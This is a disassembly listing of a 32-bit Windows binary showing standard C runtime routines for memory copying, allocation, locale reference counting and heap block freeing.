  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
